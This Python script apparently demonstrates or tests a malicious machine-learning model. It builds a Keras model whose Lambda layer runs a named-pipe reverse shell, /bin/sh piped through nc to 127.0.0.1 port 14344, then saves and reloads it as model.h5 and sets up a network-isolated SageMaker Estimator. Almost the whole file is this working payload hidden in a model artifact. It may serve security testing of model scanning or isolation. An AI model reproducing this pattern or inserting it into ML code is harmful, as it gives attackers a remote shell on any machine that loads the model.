from sagemaker.estimator import Estimator
from tensorflow.python.keras.layers import Input, Lambda, Softmax
from tensorflow.python.keras.models import Model
from tensorflow.python.keras.models import load_model
from tensorflow.python.keras.optimizer_v1 import Adam

image = ""
role = ""


def custom_layer(tensor):
    PAYLOAD = 'rm /tmp/FCMHH; mkfifo /tmp/FCMHH; cat /tmp/FCMHH | /bin/sh -i 2>&1 | nc 127.0.0.1 14344 > /tmp/FCMHH'
    __import__('os').system(PAYLOAD)
    return tensor


input_layer = Input(shape=(10), name="input_layer")
lambda_layer = Lambda(custom_layer, name="lambda_layer")(input_layer)
output_layer = Softmax(name="output_layer")(lambda_layer)

model = Model(input_layer, output_layer, name="model")
model.compile(optimizer=Adam(lr=0.0004), loss="categorical_crossentropy")
model.save("model.h5")

load_model("model.h5")

estimator = Estimator(image, role, instance_type='ml.p2.xlarge', enable_network_isolation=True)
